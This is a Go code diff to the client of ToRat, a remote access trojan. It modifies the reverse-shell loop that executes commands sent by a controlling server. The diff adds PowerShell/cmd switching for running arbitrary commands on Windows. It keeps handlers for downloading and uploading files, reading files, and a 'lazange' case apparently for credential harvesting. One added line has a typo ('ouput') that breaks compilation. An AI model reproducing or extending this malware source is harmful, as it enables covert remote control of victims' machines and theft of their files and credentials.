@@ -8,10 +8,10 @@ import (
 	"runtime"
 	"strings"
 
-	"github.com/lu4p/ToRat_client/cat"
 	"github.com/lu4p/ToRat_client/crypto"
 	"github.com/lu4p/ToRat_client/screen"
 	"github.com/lu4p/ToRat_client/shred"
+	"github.com/lu4p/cat"
 )
 
 func ls(path string) string {
@@ -24,6 +24,7 @@ func ls(path string) string {
 
 // shell is the reverse shell which is controlled by the server
 func (c *connection) shell() {
+	var powershell bool
 	for {
 		cmdbyte, err := c.recv()
 		if err != nil {
@@ -36,8 +37,18 @@ func (c *connection) shell() {
 		out := true
 
 		switch cmdsp[0] {
+		case "powershell":
+			if runtime.GOOS == "windows" {
+				powershell = true
+				output = []byte("Shell is now Powershell")
+			}
+		case "cmd":
+			if runtime.GOOS == "windows" {
+				powershell = false
+				output = []byte("Shell is now Cmd")
+			}
 		case "hostname":
-			output = crypto.GetHostname(HostnamePath)
+			output = crypto.GetHostname(HostnamePath, ServerPubKey)
 		case "down":
 			out = false
 			c.sendFile(cmdsp[1])
@@ -45,8 +56,7 @@ func (c *connection) shell() {
 			out = false
 			c.recvFile(cmdsp[1])
 		case "cd":
-			fname := strings.Split(cmd, " ")[1]
-			err := os.Chdir(fname)
+			err := os.Chdir(cmdsp[1])
 			if err != nil {
 				output = []byte("Could not Change Directory")
 			} else {
@@ -63,8 +73,12 @@ func (c *connection) shell() {
 		case "ping":
 			output = []byte("pong")
 		case "cat":
-			output = []byte(cat.Cat(cmdsp[1]))
-
+			txt, err := cat.Cat(cmdsp[1])
+			if err != nil {
+				ouput = "Something went wrong could not get txt!"
+			} else {
+				output = []byte(txt)
+			}
 		case "reconnect":
 			break
 		case "lazange":
@@ -86,7 +100,6 @@ func (c *connection) shell() {
 			} else {
 				output = []byte(path)
 			}
-
 		case "ls":
 			files, err := filepath.Glob("*")
 			if err != nil {
@@ -95,7 +108,7 @@ func (c *connection) shell() {
 			output = []byte(strings.Join(files, " "))
 
 		default:
-			output = runCmd(cmd, false)
+			output = runCmd(cmd, powershell)
 		}
 		if output == nil && out {
 			c.sendSt("No output something potentially went wrong!")
